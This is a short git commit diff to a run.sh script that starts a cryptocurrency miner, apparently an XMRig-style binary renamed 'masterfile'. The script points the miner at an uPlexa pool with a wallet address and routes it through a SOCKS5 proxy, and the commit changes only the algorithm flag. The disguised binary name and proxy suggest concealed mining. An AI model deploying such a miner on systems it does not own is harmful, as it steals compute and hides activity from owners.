5f997ae27fc55889ca3383f8cb85d5b3b8eba452
TomikoBraswell <89598982+TomikoBraswell@users.noreply.github.com>
2021-08-26 16:35:33 +0000

    Update run.sh

--- run.sh
+++ run.sh
@@ -5,4 +5,4 @@ POOL=us.uplexa.herominers.com:1177
 WALLET=UmWLzD8WeTeHGsLkg62HNL1np52QG5rRxBUc4iL6rtyGQcdUrkGwUBQQAEjSZQTR3DdW27iJrq6aAXBLrYveNegr2JwsVeAHZ
 WORKER=CPU
 PROXY=socks5://192.252.209.155:14455
-./masterfile -o $POOL -u $WALLET -p $WORKER -a cx/upx2 --donate-level 1 -t 2 -x $PROXY -k
+./masterfile -o $POOL -u $WALLET -p $WORKER -a cn/upx2 --donate-level 1 -t 2 -x $PROXY -k
